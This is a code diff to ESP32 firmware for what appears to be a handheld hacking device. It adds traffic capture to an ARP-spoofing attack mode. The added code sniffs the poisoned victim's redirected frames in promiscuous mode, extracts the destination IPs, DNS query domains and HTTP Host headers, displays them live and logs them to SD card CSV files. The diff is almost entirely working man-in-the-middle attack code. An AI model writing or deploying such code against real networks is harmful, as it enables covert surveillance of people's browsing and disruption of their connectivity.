@@ -13,6 +13,8 @@
 
 #include <Arduino.h>
 #include <WiFi.h>
+#include <SD.h>
+#include <strings.h>   // strncasecmp
 #include <esp_wifi.h>
 #include <lwip/etharp.h>
 #include <lwip/netif.h>
@@ -22,9 +24,92 @@
 #include "input_handling.h"
 #include "lockscreen_manager.h"
 #include "network_scanner.h"   // resolveNetTarget()
+#include "wifi_sd_guard.h"     // ScopedPromiscPause (GDMA rule)
+#include "sdcard_manager.h"    // SD_DIR_ARPSPOOF
 
 extern DisplayManager displayManager;
 extern InputHandling  inputHandler;
+
+// ── redirected-traffic capture ────────────────────────────────────────────────
+// While poisoning, the victim's uplink frames are addressed to OUR MAC; the AP
+// relays them to us DECRYPTED (encrypted with our pairwise key on the last hop).
+// We sniff those (from-DS, A1=us, A3=victim) and log what the victim is trying to
+// reach (dst IP + DNS query / HTTP host). Frame offsets mirror isoscan's isoCapCb.
+#define AS_CAP_RING 16
+#define AS_CAP_MAX  256
+struct AsCapFrame { uint8_t data[AS_CAP_MAX]; uint16_t len; };
+static volatile AsCapFrame s_cap[AS_CAP_RING];
+static volatile uint8_t    s_capHead = 0, s_capTail = 0;
+static volatile bool       s_capOn = false;
+static volatile uint32_t   s_capDropped = 0;
+static uint8_t s_ourMac[6], s_vicMac[6];
+
+static void IRAM_ATTR asCapCb(void* buf, wifi_promiscuous_pkt_type_t t) {
+    if (!s_capOn || t != WIFI_PKT_DATA) return;
+    wifi_promiscuous_pkt_t* pk = (wifi_promiscuous_pkt_t*)buf;
+    int len = pk->rx_ctrl.sig_len;
+    if (len < 40 || len > 2000) return;
+    const uint8_t* f = pk->payload;
+    if ((f[1] & 0x03) != 0x02) return;                  // from-DS only
+    if (memcmp(f + 4,  s_ourMac, 6) != 0) return;       // A1 = us
+    if (memcmp(f + 16, s_vicMac, 6) != 0) return;       // A3 = victim
+    uint8_t nx = (uint8_t)((s_capHead + 1) % AS_CAP_RING);
+    if (nx == s_capTail) { s_capDropped++; return; }
+    int n = len > AS_CAP_MAX ? AS_CAP_MAX : len;
+    memcpy((void*)s_cap[s_capHead].data, f, n);
+    s_cap[s_capHead].len = (uint16_t)n;
+    s_capHead = nx;
+}
+
+// Parse one captured frame → dst IP + a human "detail" (DNS domain / HTTP host /
+// proto:port). Returns false if not a parseable IPv4 uplink frame.
+static bool asParseFrame(const uint8_t* f, int len, IPAddress& dst, char* detail, int dsz) {
+    int hl = ((f[0] & 0x8C) == 0x88) ? 26 : 24;   // QoS data → +2
+    int eo = hl + 8 + 6;                           // +CCMP(8) +SNAP(6) = ethertype
+    if (eo + 2 > len) return false;
+    uint16_t et = (uint16_t)((f[eo] << 8) | f[eo + 1]);
+    if (et != 0x0800) return false;                // IPv4 only (v1)
+    int ip0 = hl + 8 + 8;                          // IP header
+    if (ip0 + 20 > len) return false;
+    int ihl = (f[ip0] & 0x0F) * 4;
+    if (ihl < 20 || ip0 + ihl > len) return false;
+    uint8_t proto = f[ip0 + 9];
+    dst = IPAddress(f[ip0 + 16], f[ip0 + 17], f[ip0 + 18], f[ip0 + 19]);
+    int th = ip0 + ihl;                            // transport header
+    detail[0] = '\0';
+    if (proto == 17 && th + 8 <= len) {            // UDP
+        uint16_t dport = (uint16_t)((f[th + 2] << 8) | f[th + 3]);
+        if (dport == 53) {                         // DNS query → pull the domain
+            int q = th + 8 + 12;                    // UDP(8) + DNS header(12) = QNAME
+            char dom[80]; int o = 0;
+            while (q < len && f[q] != 0) {
+                int l = f[q++];
+                if (l > 63 || q + l > len) { o = 0; break; }
+                for (int j = 0; j < l && o < (int)sizeof(dom) - 1; j++) dom[o++] = (char)f[q++];
+                if (q < len && f[q] != 0 && o < (int)sizeof(dom) - 1) dom[o++] = '.';
+            }
+            dom[o] = '\0';
+            snprintf(detail, dsz, "DNS %s", o ? dom : "?");
+        } else snprintf(detail, dsz, "UDP :%u", dport);
+    } else if (proto == 6 && th + 20 <= len) {     // TCP
+        uint16_t dport = (uint16_t)((f[th + 2] << 8) | f[th + 3]);
+        int thl = ((f[th + 12] >> 4) & 0x0F) * 4;
+        int pl = th + thl, pn = len - pl;
+        if (dport == 80 && pn > 6) {               // HTTP → find Host:
+            char host[64]; host[0] = '\0';
+            for (int i = pl; i + 6 < len; i++) {
+                if ((f[i]=='H'||f[i]=='h') && !strncasecmp((const char*)f + i, "host:", 5)) {
+                    int j = i + 5; while (j < len && f[j] == ' ') j++;
+                    int o = 0; while (j < len && f[j] != '\r' && f[j] != '\n' && o < 63) host[o++] = (char)f[j++];
+                    host[o] = '\0'; break;
+                }
+            }
+            snprintf(detail, dsz, host[0] ? "HTTP %s" : "HTTP :80", host);
+        } else if (dport == 443) snprintf(detail, dsz, "HTTPS");
+        else snprintf(detail, dsz, "TCP :%u", dport);
+    } else snprintf(detail, dsz, "proto %u", proto);
+    return true;
+}
 
 // ── raw ARP-reply frame (built by byte offset — no packed-struct alignment risk)
 // Layout (ETH_PAD_SIZE=0 on ESP32): eth(14) + arp(28) = 42 bytes.
@@ -151,8 +236,27 @@ void runArpSpoof(char* args) {
         dm.setTextColor(TFT_RED); dm.println("Gateway MAC unresolved."); delay(2000); return;
     }
 
+    // ── open SD log (BEFORE promiscuous — GDMA rule) ──────────────────────────
+    char logPath[48] = {0};
+    File logf;
+    { int idx = 1;
+      do { snprintf(logPath, sizeof(logPath), "%s/%03d.csv", SD_DIR_ARPSPOOF, idx++); }
+      while (SD.exists(logPath) && idx < 1000);
+      logf = SD.open(logPath, FILE_WRITE);
+      if (logf) logf.println("time_ms,dst_ip,detail"); }
+
+    // ── start capture: sniff the victim's uplink the AP relays to us ──────────
+    memcpy(s_ourMac, ourMac, 6);
+    memcpy(s_vicMac, victimMac, 6);
+    s_capHead = s_capTail = 0; s_capDropped = 0;
+    esp_wifi_set_promiscuous_rx_cb(asCapCb);
+    wifi_promiscuous_filter_t filt; filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous(true);   // stays associated on the AP channel
+    s_capOn = true;
+
     // ── static screen (redrawn on unlock), stats updated in place ─────────────
-    const int statY = 128;
+    const int statY = 124, reachLblY = 144, reachY = 160;
     auto drawStatic = [&]() {
         dm.clearScreen();
         dm.setTextColor(TFT_RED);   dm.setCursor(10, 40);  dm.printText("[ARP::SPOOF]");
@@ -160,14 +264,15 @@ void runArpSpoof(char* args) {
         dm.setTextColor(0x7BEF);    dm.setCursor(10, 58);  dm.printText("redirect/DoS - no forwarding (1 radio)");
         dm.setTextColor(0xC618);    dm.setCursor(10, 78);  dm.printText("victim  " + victimIp.toString());
         dm.setCursor(112, 78); dm.printText(asMacStr(victimMac));
-        dm.setCursor(10, 92);  dm.printText("gateway " + gwIp.toString());
+        dm.setTextColor(0xC618);    dm.setCursor(10, 92);  dm.printText("gateway " + gwIp.toString());
         dm.setCursor(112, 92); dm.printText(asMacStr(gwMac));
-        dm.setTextColor(TFT_WHITE); dm.setCursor(10, 106); dm.printText("as      " + asMacStr(ourMac));
-        dm.setTextColor(0x7BEF);    dm.setCursor(10, 214); dm.printText("[q] stop + heal caches");
+        dm.setTextColor(0x5AEB);    dm.setCursor(10, reachLblY); dm.printText("victim reaching:");
+        dm.setTextColor(0x7BEF);    dm.setCursor(10, 214); dm.printText("[q] stop + heal");
     };
     drawStatic();
 
-    uint32_t pkts = 0, lastTx = 0, lastDraw = 0;
+    uint32_t pkts = 0, captured = 0, lastTx = 0, lastDraw = 0;
+    char reach[3][60] = {{0},{0},{0}};
     bool stop = false;
     while (!stop) {
         if (LockScreenManager::getInstance().consumeJustUnlocked()) drawStatic();
@@ -178,17 +283,42 @@ void runArpSpoof(char* args) {
             asSendArpReply(nif, victimIp, ourMac, gwIp,     gwMac);       // gateway: "victim is us"
             pkts += 2;
         }
-        if (now - lastDraw >= 500 && !displayManager.isBlocked()) {
+        // drain captured frames → parse → live list + SD log
+        while (s_capTail != s_capHead) {
+            uint8_t fr[AS_CAP_MAX]; int fl = s_cap[s_capTail].len;
+            if (fl > AS_CAP_MAX) fl = AS_CAP_MAX;
+            memcpy(fr, (const void*)s_cap[s_capTail].data, fl);
+            s_capTail = (uint8_t)((s_capTail + 1) % AS_CAP_RING);
+            IPAddress dst; char detail[96];
+            if (asParseFrame(fr, fl, dst, detail, sizeof(detail))) {
+                captured++;
+                memmove(reach[0], reach[1], sizeof(reach[0]));
+                memmove(reach[1], reach[2], sizeof(reach[0]));
+                snprintf(reach[2], sizeof(reach[2]), "%s %s", dst.toString().c_str(), detail);
+                if (logf) { ScopedPromiscPause _; logf.printf("%lu,%s,%s\n",
+                            (unsigned long)millis(), dst.toString().c_str(), detail); logf.flush(); }
+            }
+        }
+        if (now - lastDraw >= 400 && !displayManager.isBlocked()) {
             lastDraw = now;
-            dm.fillRect(10, statY, SCREEN_WIDTH - 20, 16, TFT_BLACK);
+            dm.fillRect(10, statY, SCREEN_WIDTH - 20, 14, TFT_BLACK);
             dm.setCursor(10, statY); dm.setTextColor(TFT_GREEN);
-            char line[44];
-            snprintf(line, sizeof(line), "POISONING  %lu sent  (2/s)", (unsigned long)pkts);
+            char line[48];
+            snprintf(line, sizeof(line), "POISONING %lu   captured %lu", (unsigned long)pkts, (unsigned long)captured);
             dm.printText(line);
+            dm.fillRect(10, reachY, SCREEN_WIDTH - 20, 3 * 14, TFT_BLACK);
+            dm.setTextColor(0xFFE0);
+            for (int i = 0; i < 3; i++) if (reach[i][0]) { dm.setCursor(10, reachY + i * 14); dm.printText(String(reach[i])); }
         }
         if (inputHandler.getKeyboardInput() == 'q') stop = true;
-        delay(20);
+        delay(15);
     }
+
+    // ── stop capture (before SD close + heal) ─────────────────────────────────
+    s_capOn = false;
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    if (logf) logf.close();
 
     // ── heal: restore real MACs on both ends ──────────────────────────────────
     dm.fillRect(10, statY, SCREEN_WIDTH - 20, 16, TFT_BLACK);
